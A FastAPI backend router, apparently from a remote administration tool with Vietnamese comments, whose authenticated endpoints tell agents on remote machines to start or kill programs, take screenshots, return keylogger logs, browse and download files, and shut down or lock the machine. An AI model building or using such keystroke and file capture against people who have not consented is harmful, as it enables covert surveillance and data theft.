# web-app/backend/routers/modules.py
from fastapi import APIRouter, HTTPException, status, Depends  # 🌟 Thêm Depends vào đây
from pydantic import BaseModel
from core.gateway_client import gateway_client  
from core.security import get_current_user  # 🛡️ Nhập ổ khóa gác cổng từ file security

router = APIRouter(prefix="/api/modules", tags=["Modules Control"])

# =====================================================================
# 📦 KHUÔN MẪU DỮ LIỆU ĐẦU VÀO
# =====================================================================
class KillProcessRequest(BaseModel):
    machine_id: str
    pid: int
    process_name: str

class PowerRequest(BaseModel):
    machine_id: str
    action: str  # "shutdown", "restart", "lock", "sleep"

class FileActionRequest(BaseModel):
    machine_id: str
    file_path: str
    action: str  # "download", "view", "delete"

class AppActionRequest(BaseModel):
    machine_id: str
    app_name: str  # Tên file thực thi, VD: notepad.exe, calc.exe

class BrowseDirectoryRequest(BaseModel):
    machine_id: str
    target_path: str

# =====================================================================
# 🛠️ ĐẦU NỐI CHI TIẾT ĐÃ ĐƯỢC BẢO MẬT (TẤT CẢ PHẢI QUADepends)
# =====================================================================

# 1️⃣ 📁 Applications: Xem danh sách phần mềm đang chạy
@router.post("/applications/start")
async def start_application(data: AppActionRequest, current_user: str = Depends(get_current_user)):
    try:
        await gateway_client.send_command_and_wait(
            machine_id=data.machine_id,
            module="applications",
            action="start",
            payload={"app_name": data.app_name}
        )
        return {
            "status": "success",
            "message": f"Đã phát lệnh khởi chạy {data.app_name} trên máy {data.machine_id}."
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@router.post("/applications/stop")
async def stop_application(data: AppActionRequest, current_user: str = Depends(get_current_user)):
    try:
        await gateway_client.send_command_and_wait(
            machine_id=data.machine_id,
            module="applications",
            action="stop",
            payload={"app_name": data.app_name}
        )
        return {
            "status": "success",
            "message": f"Đã phát lệnh đóng ứng dụng {data.app_name} trên máy {data.machine_id}."
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


# 2️⃣ ⚙️ Processes: Ra lệnh tắt một tiến trình ngầm (Task Manager)
@router.post("/processes/kill")
async def kill_process(data: KillProcessRequest, current_user: str = Depends(get_current_user)):
    try:
        # Gửi payload chứa PID chính xác mà Frontend yêu cầu hạ lệnh xuống Agent
        await gateway_client.send_command_and_wait(
            machine_id=data.machine_id,
            module="processes",
            action="kill",
            payload={"pid": data.pid}
        )
        return {
            "status": "success",
            "message": f"Đã phát lệnh dừng tiến trình {data.process_name} (PID: {data.pid}) trên máy {data.machine_id}."
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


# 3️⃣ 📸 Screenshot: Chụp màn hình đơn lẻ theo yêu cầu
@router.get("/screenshot/{machine_id}")
async def trigger_screenshot(machine_id: str, current_user: str = Depends(get_current_user)):
    try:
        agent_data = await gateway_client.send_command_and_wait(
            machine_id=machine_id,
            module="screenshot",
            action="capture"
        )
        return {
            "status": "success",
            "machine_id": machine_id,
            "screenshot_base64": agent_data.get("image_base64")
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


# 5️⃣ ⌨️ Keylogger: Xem nhật ký phím gõ được
@router.get("/keylogger/{machine_id}")
async def get_keylogger(machine_id: str, current_user: str = Depends(get_current_user)):
    try:
        agent_data = await gateway_client.send_command_and_wait(
            machine_id=machine_id,
            module="keylogger",
            action="get_logs"
        )
        return {
            "status": "success",
            "machine_id": machine_id,
            "logs": agent_data.get("logs", "Không có dữ liệu nhật ký mới.")
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


# 6️⃣ 📥 File Management: Thao tác file (Download/View/Delete)
@router.post("/file/browse")
async def browse_directory(data: BrowseDirectoryRequest, current_user: str = Depends(get_current_user)):
    """
    Endpoint nhận yêu cầu từ Frontend để liệt kê tất cả file/thư mục bên trong một đường dẫn cụ thể.
    """
    try:
        # Gửi lệnh xuống Agent thông qua Gateway Client bằng cơ chế đồng bộ giả lập (Future)
        agent_data = await gateway_client.send_command_and_wait(
            machine_id=data.machine_id,
            module="file",
            action="list_dir",
            payload={"target_path": data.target_path}
        )
        
        # Trả về kết quả cho Frontend sau khi Agent đã quét xong ổ đĩa đích
        return {
            "status": "success",
            "current_path": agent_data.get("current_path", ""),
            "files": agent_data.get("files", [])  # Mảng danh sách các file/thư mục
        }
    except Exception as e:
        # Bắt toàn bộ lỗi hệ thống (Timeout, Mất kết nối Agent...) và trả về mã lỗi 500
        raise HTTPException(status_code=500, detail=str(e))

@router.post("/file/download")
async def download_file_content(data: FileActionRequest, current_user: str = Depends(get_current_user)):
    """
    Endpoint nhận yêu cầu tải một file cụ thể từ máy Agent về Web App.
    """
    # Ràng buộc bảo mật: Kiểm tra xem hành động gửi lên có đúng là đòi download không
    if data.action != "download":
        raise HTTPException(status_code=400, detail="Hành động không hợp lệ cho endpoint này!")
        
    try:
        # Hạ lệnh cho Agent đọc file và chuyển đổi file đó thành dạng văn bản an toàn để truyền qua mạng
        agent_data = await gateway_client.send_command_and_wait(
            machine_id=data.machine_id,
            module="file",
            action="download",
            payload={"file_path": data.file_path}
        )
        
        return {
            "status": "success",
            "file_name": agent_data.get("file_name"),
            # Dữ liệu file đã được mã hóa Base64 dạng chuỗi text để vận chuyển an toàn qua JSON
            "file_base64": agent_data.get("file_base64") 
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


# 8️⃣ 🔌 Power Control: Điều khiển Nguồn máy tính từ xa
@router.post("/power/control")
async def power_control(data: PowerRequest, current_user: str = Depends(get_current_user)):
    if data.action not in ["shutdown", "restart", "lock", "sleep"]:
        raise HTTPException(status_code=400, detail="Hành động nguồn không hợp lệ!")
    
    try:
        await gateway_client.send_command_and_wait(
            machine_id=data.machine_id,
            module="power",
            action=data.action
        )
        return {
            "status": "success",
            "message": f"Đã phát lệnh {data.action.upper()} tới thiết bị {data.machine_id} thành công sau khi được User xác nhận."
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))